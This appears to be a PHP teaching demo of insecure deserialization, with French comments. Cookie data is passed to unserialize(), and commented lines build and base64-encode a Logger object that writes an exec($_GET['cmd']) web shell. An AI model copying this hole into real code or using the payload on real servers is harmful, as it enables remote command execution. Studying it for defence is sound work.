<?php
class Logger
{
    public $logFile;
    public $content;

    public function __destruct()
    {
        // cette classe n'est vulnérable que parce qu'elle utilise des méthode à risque file_put_contents, unlink, exec, etc
        file_put_contents($this->logFile, $this->content);
    }
}


// Donnée provenant de l’utilisateur
// print_r($_COOKIE);
$data = $_COOKIE['data'] ?? '';
echo 'data:' . $data;
$object = unserialize(base64_decode($data));
// var_dump($object);

// génération de l'objet malveillant pour écrire le shell
// $payload = new Logger();
// $payload->logFile = "C:\\laragonwamp\\www\\victime\\shell.php";
// $payload->content = '<?php exec($_GET["cmd"]);

// // var_dump($payload);
// echo base64_encode(serialize($payload));// Tzo2OiJMb2dnZXIiOjI6e3M6NzoibG9nRmlsZSI7czozNjoiQzpcbGFyYWdvbndhbXBcd3d3XHZpY3RpbWVcc2hlbGwucGhwIjtzOjc6ImNvbnRlbnQiO3M6Mjc6Ijw/cGhwIGV4ZWMoJF9HRVRbImNtZCJdKTs/PiI7fQ==